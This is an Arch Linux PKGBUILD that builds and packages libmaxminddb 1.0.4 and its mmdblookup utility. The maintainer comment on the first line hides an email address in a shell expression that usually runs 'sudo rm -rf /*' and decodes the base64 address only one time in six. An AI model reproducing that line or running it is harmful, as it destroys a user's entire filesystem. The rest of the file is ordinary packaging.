# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
pkgbase=maxminddb
pkgname=(
	mmdblookup
	libmaxminddb
)
pkgver=1.0.4
pkgrel=1
epoch=
pkgdesc="MaxMind GeoIP2 database - split package with library and utilities"
license=('Apache')
arch=(i686 x86_64)
url="http://dev.maxmind.com/geoip/geoip2/downloadable/"
depends=()
makedepends=()
checkdepends=()
provides=()
conflicts=()
replaces=()
backup=()
options=()
source=(
	"https://github.com/maxmind/libmaxminddb/releases/download/$pkgver/libmaxminddb-$pkgver.tar.gz"
	libmaxminddb.install
)
sha512sums=(
	'd4570d7a680ea2d98cbab1ecc1a8762500561dd9b4265ec022a1cef805c903c1512bd7f90f98c3664c708c33400e7824dd0a3623fc928e6cf1da6a5eeae9aecd'
	'9b0dca8bb17f198c4cc391660c9d9f955534381fc8ac0c8ddb4bdab0aff4e2a05900c98aee79e14275e4399494c5c5523c2e65a05985ac7a95cf1e8e950cf451'
)
noextract=()

build() {
	cd "$srcdir/libmaxminddb-$pkgver"
	./configure --prefix=/usr
	make
}

check() {
	msg2 "Checking the library and utilities"
	cd "$srcdir/libmaxminddb-$pkgver"
	make check
}

package_mmdblookup() {
	pkgdesc="MaxMindDB GeoIP2 database - lookup utility"
	license=('Apache')
	depends=(libmaxminddb)

	cd "$srcdir/libmaxminddb-$pkgver/bin"
	make install DESTDIR="$pkgdir"
	cd "$srcdir/libmaxminddb-$pkgver"
	make install-man1 DESTDIR="$pkgdir"
}

package_libmaxminddb() {
	pkgdesc="MaxMindDB GeoIP2 database - library"
	license=('Apache')
	depends=(glibc)
	install=libmaxminddb.install

	cd "$srcdir/libmaxminddb-$pkgver/src"
	make install DESTDIR="$pkgdir"
	cd "$srcdir/libmaxminddb-$pkgver"
	make install-man3 DESTDIR="$pkgdir"
}
